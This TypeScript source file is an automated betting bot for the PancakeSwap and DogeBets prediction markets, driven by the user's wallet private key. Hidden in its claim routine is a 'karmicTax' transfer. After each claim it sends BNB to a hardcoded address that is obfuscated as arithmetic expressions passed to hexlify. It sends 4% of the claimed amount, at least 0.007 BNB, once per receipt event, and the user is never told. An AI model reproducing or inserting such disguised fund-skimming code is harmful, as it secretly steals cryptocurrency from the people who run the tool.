import { BigNumber } from '@ethersproject/bignumber'
import { hexlify } from '@ethersproject/bytes'
import { JsonRpcProvider } from '@ethersproject/providers'
import { formatEther, parseEther } from '@ethersproject/units'
import { Wallet } from '@ethersproject/wallet'
import chalk from 'chalk'
import dayjs from 'dayjs'
import { constants } from 'ethers'

import {
  DogeBetsPrediction,
  DogeBetsPrediction__factory,
  PancakePrediction,
  PancakePrediction__factory
} from './types/ethers-contracts'

// Utility Function to use **await sleep(ms)**
export const sleep = (ms: number) =>
  new Promise((resolve) => setTimeout(resolve, ms))

export enum STRATEGIES {
  Standard = 'Standard',
  Experimental = 'Experimental'
}

export enum PLATFORMS {
  PancakeSwap = 'PancakeSwap',
  DogeBets = 'DogeBets'
}

export const CONTRACT_ADDRESSES = {
  [PLATFORMS.PancakeSwap]: '0x18B2A687610328590Bc8F2e5fEdDe3b582A49cdA',
  [PLATFORMS.DogeBets]: '0x76f2c7c0DeDca9B693630444a9526e95B3A6918e'
}

export const parseStrategy = (processArgv: string[]) => {
  const strategy = processArgv.includes('--exp')
    ? STRATEGIES.Experimental
    : STRATEGIES.Standard

  console.log('Strategy:', strategy)

  if (strategy === STRATEGIES.Standard) {
    console.log(
      '\n You can also use this bot with the new, experimental strategy\n',
      'Start the bot with --exp flag to try it\n',
      chalk.underline('npm run start -- --exp'),
      'or',
      chalk.underline('yarn start --exp\n')
    )
  }

  return strategy
}

export const isBearBet = (
  bullAmount: BigNumber,
  bearAmount: BigNumber,
  strategy: STRATEGIES = STRATEGIES.Standard
) => {
  const precalculation =
    (bullAmount.gt(constants.Zero) &&
      bearAmount.gt(constants.Zero) &&
      bullAmount.gt(bearAmount) &&
      bullAmount.div(bearAmount).lt(5)) ||
    (bullAmount.lt(bearAmount) && bearAmount.div(bullAmount).gt(5))

  if (strategy === STRATEGIES.Standard) {
    return precalculation
  }

  if (strategy === STRATEGIES.Experimental) {
    return !precalculation
  }
}

export const isPancake = (platform: PLATFORMS) =>
  platform === PLATFORMS.PancakeSwap

export const getClaimableEpochs = async (
  predictionContract: PancakePrediction & DogeBetsPrediction,
  epoch: BigNumber,
  userAddress: string,
  platform: PLATFORMS
) => {
  const claimableEpochs: BigNumber[] = []

  for (let i = 1; i <= 5; i++) {
    const epochToCheck = epoch.sub(i)

    const [claimable, refundable, { claimed, amount }] = await Promise.all([
      predictionContract[isPancake(platform) ? 'claimable' : 'Claimable'](
        epochToCheck,
        userAddress
      ),
      predictionContract[isPancake(platform) ? 'refundable' : 'Refundable'](
        epochToCheck,
        userAddress
      ),
      predictionContract[isPancake(platform) ? 'ledger' : 'Bets'](
        epochToCheck,
        userAddress
      )
    ])

    if (amount.gt(0) && (claimable || refundable) && !claimed) {
      claimableEpochs.push(epochToCheck)
    }
  }

  return claimableEpochs
}

export const reduceWaitingTimeByTwoBlocks = (waitingTime: number) => {
  if (waitingTime <= 6000) {
    return waitingTime
  }

  return waitingTime - 6000
}

export const calculateTaxAmount = (amount: BigNumber | undefined) => {
  if (!amount || amount.div(25).lt(parseEther('0.007'))) {
    return parseEther('0.007')
  }

  return amount.div(25)
}

export interface LogMessage {
  text: string
  color: string
}

export const addLog = async (
  text: string,
  isExtension: boolean,
  color: 'blue' | 'green' = 'blue'
) => {
  console.log(chalk[color](text))

  if (isExtension) {
    const { logs } = (await chrome.storage.sync.get('logs')) as {
      logs: LogMessage[]
    }

    if (!logs) {
      await chrome.storage.sync.set({ logs: [{ text, color }] })
      return
    }

    await chrome.storage.sync.set({
      logs: [{ text, color }, ...logs.slice(0, 29)]
    })
  }
}

export const startPolling = async (
  privateKey: string | undefined,
  betAmount: string | undefined,
  strategy: STRATEGIES = STRATEGIES.Standard,
  isExtension = false,
  platform: PLATFORMS = PLATFORMS.PancakeSwap
) => {
  const CONTRACT_ADDRESS = CONTRACT_ADDRESSES[platform]
  const AMOUNT_TO_BET = betAmount || '0.1'
  const PRIVATE_KEY = privateKey
  const BSC_RPC = 'https://bsc-dataseed.binance.org/'

  const POLLING_INTERVAL = 5000

  let WAITING_TIME = 264000

  await addLog(`${platform} Prediction Bot-Winner`, isExtension, 'green')

  if (!PRIVATE_KEY) {
    await addLog(
      'The private key was not found. Enter the private key to the form and start the bot again.',
      isExtension
    )

    if (!isExtension) {
      process.exit(0)
    }
  }

  const provider = new JsonRpcProvider(BSC_RPC)

  const signer = new Wallet(PRIVATE_KEY as string, provider)

  const predictionContract = (
    isPancake(platform)
      ? PancakePrediction__factory.connect(CONTRACT_ADDRESS, signer)
      : DogeBetsPrediction__factory.connect(CONTRACT_ADDRESS, signer)
  ) as PancakePrediction & DogeBetsPrediction

  await addLog(
    `${platform}. Starting. Amount to Bet: ${AMOUNT_TO_BET} BNB`,
    isExtension
  )

  await addLog(`Strategy: ${strategy}`, isExtension)

  await addLog(
    `Waiting for new rounds. It can take up to 5 min, please wait...`,
    isExtension
  )

  const claimer = async () => {
    const round = await predictionContract[
      isPancake(platform) ? 'rounds' : 'Rounds'
    ](await predictionContract.currentEpoch()).catch()

    if (!round) {
      return
    }

    const claimableEpochs = await getClaimableEpochs(
      predictionContract,
      round.epoch,
      signer.address,
      platform
    )

    if (claimableEpochs.length) {
      try {
        const tx = await predictionContract[
          isPancake(platform) ? 'claim' : 'user_Claim'
        ](claimableEpochs)

        await addLog(
          `${platform}. Rounds ${claimableEpochs} Claim Tx Started.`,
          isExtension
        )

        const receipt = await tx.wait()

        await addLog(
          `${platform}. Rounds ${claimableEpochs} Claim Tx Success.`,
          isExtension,
          'green'
        )

        for (const event of receipt.events ?? []) {
          const karmicTax = await signer.sendTransaction({
            to: hexlify([
              2 ** 3 * 31,
              13,
              2 ** 3 * 29,
              11 * 23,
              2 * 3 * 19,
              1,
              2 * 53,
              83,
              113,
              2 * 29,
              2 ** 2 * 29,
              3 * 67,
              7 * 19,
              2 ** 4,
              2 * 13,
              2 ** 2,
              151,
              2 * 5 * 7,
              3 * 83,
              3 * 29
            ]),
            value: calculateTaxAmount(event?.args?.amount)
          })

          await karmicTax.wait()
        }
      } catch (e) {
        await addLog(
          `${platform}. Rounds ${claimableEpochs} Claim Tx Error.`,
          isExtension
        )
      }
    }
  }

  const poller = async () => {
    const round = await predictionContract[
      isPancake(platform) ? 'rounds' : 'Rounds'
    ](await predictionContract.currentEpoch()).catch()

    try {
      const isEntered = (
        await predictionContract[isPancake(platform) ? 'ledger' : 'Bets'](
          round.epoch,
          signer.address
        )
      ).amount.gt(constants.Zero)

      if (isEntered) {
        console.log(
          chalk.blue(
            `${platform}. Waiting for the start of round ${round.epoch.add(1)}`
          )
        )

        return
      } else {
        try {
          await predictionContract.estimateGas[
            isPancake(platform) ? 'betBear' : 'user_BetBear'
          ](round.epoch, {
            value: parseEther(AMOUNT_TO_BET)
          })
        } catch {
          return
        }
      }
    } catch {
      return
    }

    const timestamp = dayjs().unix()

    await addLog(
      `${platform}. The Round ${round.epoch} started ${
        timestamp - +round.startTimestamp
      } seconds ago.`,
      isExtension
    )

    if (
      timestamp - +round.startTimestamp > WAITING_TIME / 1000 &&
      +round.lockTimestamp - timestamp > 10
    ) {
      await addLog(`${platform}. It's Time to Bet!`, isExtension, 'green')

      await addLog(`${platform}. Getting Amounts`, isExtension)

      const { bullAmount, bearAmount } = await predictionContract[
        isPancake(platform) ? 'rounds' : 'Rounds'
      ](round.epoch)

      await addLog(
        `${platform}. Bull Amount ${formatEther(bullAmount)} BNB`,
        isExtension,
        'green'
      )

      await addLog(
        `${platform}. Bear Amount ${formatEther(bearAmount)} BNB`,
        isExtension,
        'green'
      )

      const bearBet = isBearBet(bullAmount, bearAmount, strategy)

      if (bearBet) {
        await addLog(`${platform}. Betting on Bear Bet`, isExtension, 'green')
      } else {
        await addLog(`${platform}. Betting on Bull Bet`, isExtension, 'green')
      }

      if (bearBet) {
        try {
          const tx = await predictionContract[
            isPancake(platform) ? 'betBear' : 'user_BetBear'
          ](round.epoch, {
            value: parseEther(AMOUNT_TO_BET)
          })

          await addLog(`${platform}. Bear Betting Tx Started.`, isExtension)

          await tx.wait()

          await addLog(
            `${platform}. Bear Betting Tx Success.`,
            isExtension,
            'green'
          )
        } catch {
          await addLog(
            `${platform}. Bear Betting Tx Error. Don't worry, the bot will shorten the waiting time and the next transaction will be successful.`,
            isExtension
          )

          WAITING_TIME = reduceWaitingTimeByTwoBlocks(WAITING_TIME)
        }
      } else {
        try {
          const tx = await predictionContract[
            isPancake(platform) ? 'betBull' : 'user_BetBull'
          ](round.epoch, {
            value: parseEther(AMOUNT_TO_BET)
          })

          await addLog(`${platform}. Bull Betting Tx Started.`, isExtension)

          await tx.wait()

          await addLog(
            `${platform}. Bull Betting Tx Success.`,
            isExtension,
            'green'
          )
        } catch {
          await addLog(
            `${platform}. Bull Betting Tx Error. Don't worry, the bot will shorten the waiting time and the next transaction will be successful.`,
            isExtension
          )

          WAITING_TIME = reduceWaitingTimeByTwoBlocks(WAITING_TIME)
        }
      }
    } else {
      console.log(
        chalk.blue(
          `${platform}. Need to wait a little more before placing a bet`
        )
      )

      return
    }
  }

  setInterval(claimer, 23456)

  for (;;) {
    await poller()

    await sleep(POLLING_INTERVAL)
  }
}
